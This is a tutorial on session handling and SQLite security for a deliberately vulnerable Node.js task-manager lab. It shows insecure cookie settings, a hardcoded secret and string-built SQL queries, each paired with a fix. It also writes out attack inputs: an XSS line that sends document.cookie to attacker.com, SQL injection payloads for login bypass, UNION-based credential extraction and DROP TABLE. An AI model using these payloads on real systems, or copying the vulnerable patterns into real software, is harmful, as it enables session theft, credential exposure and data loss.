# Session Management & SQLite Deep Dive

## Session Management in the Vulnerable Task Manager

### What is Session Management?

Session management is how web applications maintain state and remember who you are across multiple HTTP requests. Since HTTP is stateless (each request is independent), sessions provide a way to link requests together and maintain user context.

---

## How Sessions Work in This Application

### 1. Session Middleware Setup

```javascript
app.use(session({
    secret: SECRET_KEY,                    // Used to sign session ID
    resave: false,                        // Don't save session if unmodified
    saveUninitialized: true,              // Save new sessions even if empty
    cookie: { 
        secure: false,                    // ⚠️ VULNERABLE: Should be true with HTTPS
        httpOnly: false,                  // ⚠️ VULNERABLE: Should be true
        maxAge: 24 * 60 * 60 * 1000      // 24 hours in milliseconds
    }
}));
```

### 2. Session Flow

```
1. User visits website
   ↓
2. Server creates session ID (e.g., "abc123def456")
   ↓
3. Server stores session data in memory
   ↓
4. Server sends session ID to browser as cookie
   ↓
5. Browser includes cookie in all future requests
   ↓
6. Server uses session ID to retrieve user data
```

### 3. Session Storage in Code

**Creating a session (login)**:
```javascript
// When user logs in successfully
req.session.userId = user.id;          // Store user ID in session
req.session.username = user.username;  // Store username in session
```

**Using session data**:
```javascript
// Check if user is logged in
if (!req.session.userId) {
    return res.status(401).json({ error: 'Unauthorized' });
}

// Get current user's ID
const userId = req.session.userId;
```

**Destroying a session (logout)**:
```javascript
req.session.destroy((err) => {
    if (err) {
        return res.status(500).json({ error: 'Failed to logout' });
    }
    res.json({ message: 'Logged out successfully' });
});
```

---

## Session Security Vulnerabilities

### 1. Hardcoded Secret Key
```javascript
const SECRET_KEY = "admin123password";  // ⚠️ NEVER do this!
```

**Problem**: Anyone with access to the code can forge sessions
**Fix**: Use environment variables
```javascript
const SECRET_KEY = process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');
```

### 2. Insecure Cookie Settings

**Current (Vulnerable)**:
```javascript
cookie: { 
    secure: false,     // ⚠️ Allows HTTP transmission
    httpOnly: false,   // ⚠️ Accessible via JavaScript
    maxAge: 24 * 60 * 60 * 1000
}
```

**Secure Configuration**:
```javascript
cookie: { 
    secure: true,      // ✅ HTTPS only
    httpOnly: true,    // ✅ No JavaScript access
    sameSite: 'strict', // ✅ CSRF protection
    maxAge: 24 * 60 * 60 * 1000
}
```

### 3. Session Hijacking Risk

**How it works**:
1. Attacker steals session cookie (via XSS or network sniffing)
2. Attacker uses cookie to impersonate user
3. Server treats attacker as legitimate user

**Example Attack**:
```javascript
// XSS payload to steal session cookie
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

---

## SQLite Database Deep Dive

### What is SQLite?

SQLite is a lightweight, file-based database that doesn't require a separate server process. It's perfect for development, small applications, and embedded systems.

### Key Characteristics

- **File-based**: Entire database is a single file
- **Serverless**: No database server required
- **Zero-configuration**: No setup needed
- **Self-contained**: Everything in one library
- **ACID compliant**: Supports transactions

---

## SQLite in the Vulnerable Task Manager

### 1. Database Connection

```javascript
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./tasks.db');
```

**What happens**:
- Creates/opens `tasks.db` file in current directory
- If file doesn't exist, SQLite creates it automatically
- `.verbose()` enables detailed error messages

### 2. Database Schema Creation

```javascript
db.serialize(() => {
    // Create users table
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        email TEXT,
        password TEXT
    )`);
    
    // Create tasks table
    db.run(`CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        title TEXT,
        description TEXT,
        completed BOOLEAN DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )`);
});
```

**`db.serialize()`**: Ensures commands run in sequence, not parallel

### 3. Database Operations

**INSERT (Secure)**:
```javascript
// ✅ Using parameterized queries (secure)
const query = `INSERT INTO users (username, email, password) VALUES (?, ?, ?)`;
db.run(query, [username, email, password], function(err) {
    if (err) {
        return res.status(400).json({ error: 'Username already exists' });
    }
    res.json({ message: 'Registration successful' });
});
```

**SELECT (Vulnerable)**:
```javascript
// ⚠️ SQL injection vulnerability
const query = `SELECT * FROM users WHERE username = '${username}'`;
db.get(query, (err, user) => {
    // Process user data
});
```

**UPDATE (Partially Secure)**:
```javascript
// ✅ Using parameterized queries for data
const query = `UPDATE tasks SET title = ?, description = ?, completed = ? WHERE id = ?`;
db.run(query, [title, description, completed, taskId], (err) => {
    // Handle response
});
```

**DELETE (Vulnerable)**:
```javascript
// ⚠️ SQL injection vulnerability
const query = `DELETE FROM tasks WHERE id = ${taskId}`;
db.run(query, (err) => {
    // Handle response
});
```

---

## SQL Injection Vulnerabilities Explained

### 1. Login Bypass

**Vulnerable Code**:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

**Attack Payload**:
```
Username: admin' OR '1'='1' --
Password: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
```

**What happens**:
- `'1'='1'` is always true
- `--` comments out the rest of the query
- Returns first user in database (usually admin)

### 2. Data Extraction

**Vulnerable Code**:
```javascript
query += ` AND (title LIKE '%${search}%' OR description LIKE '%${search}%')`;
```

**Attack Payload**:
```
Search: ' UNION SELECT username, password, email, id FROM users --
```

**Resulting Query**:
```sql
SELECT * FROM tasks WHERE user_id = 1 AND (title LIKE '%' UNION SELECT username, password, email, id FROM users --%')
```

**What happens**:
- `UNION` combines results from tasks and users tables
- Exposes all usernames and passwords
- Comments out the rest of the query

### 3. Data Manipulation

**Attack Payload**:
```
Task ID: 1; DROP TABLE users; --
```

**Resulting Query**:
```sql
DELETE FROM tasks WHERE id = 1; DROP TABLE users; --
```

**What happens**:
- Deletes the intended task
- Drops the entire users table
- Comments out any remaining code

---

## How to Fix These Vulnerabilities

### 1. Use Parameterized Queries

**Instead of**:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

**Use**:
```javascript
const query = `SELECT * FROM users WHERE username = ?`;
db.get(query, [username], (err, user) => {
    // Safe from SQL injection
});
```

### 2. Input Validation

```javascript
function validateUsername(username) {
    if (!username || username.length < 3 || username.length > 20) {
        return false;
    }
    // Only allow alphanumeric and underscore
    return /^[a-zA-Z0-9_]+$/.test(username);
}
```

### 3. Secure Session Configuration

```javascript
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: true,      // HTTPS only
        httpOnly: true,    // No JavaScript access
        sameSite: 'strict', // CSRF protection
        maxAge: 30 * 60 * 1000  // 30 minutes
    }
}));
```

---

## SQLite File Structure

### Database File Location
```
project-root/
├── app.js
├── package.json
├── tasks.db          ← SQLite database file
└── public/
```

### Viewing Database Contents

**Using SQLite Command Line**:
```bash
# Open database
sqlite3 tasks.db

# List tables
.tables

# View users
SELECT * FROM users;

# View tasks
SELECT * FROM tasks;

# Exit
.quit
```

**Using DB Browser for SQLite** (GUI):
1. Download from https://sqlitebrowser.org/
2. Open `tasks.db` file
3. Browse data, execute queries, view schema

---

## Security Best Practices Summary

### Session Management
- Use strong, random secret keys
- Enable `httpOnly` and `secure` cookie flags
- Implement session timeout
- Regenerate session IDs after login
- Use HTTPS in production

### Database Security
- Always use parameterized queries
- Validate and sanitize all inputs
- Implement proper error handling
- Use least privilege database accounts
- Regular security updates

### General Security
- Never trust user input
- Implement proper authentication and authorization
- Log security events
- Regular security testing
- Keep dependencies updated

---

## Testing and Learning

### Session Testing
1. **Inspect browser cookies**: Developer Tools → Application → Cookies
2. **Test session timeout**: Wait for session to expire
3. **Test session hijacking**: Copy session cookie to different browser

### Database Testing
1. **Test SQL injection**: Try malicious inputs in search and login
2. **View database**: Use SQLite browser to see stored data
3. **Test data extraction**: Use UNION queries to extract sensitive data

This application provides a safe environment to learn about these vulnerabilities and how to prevent them!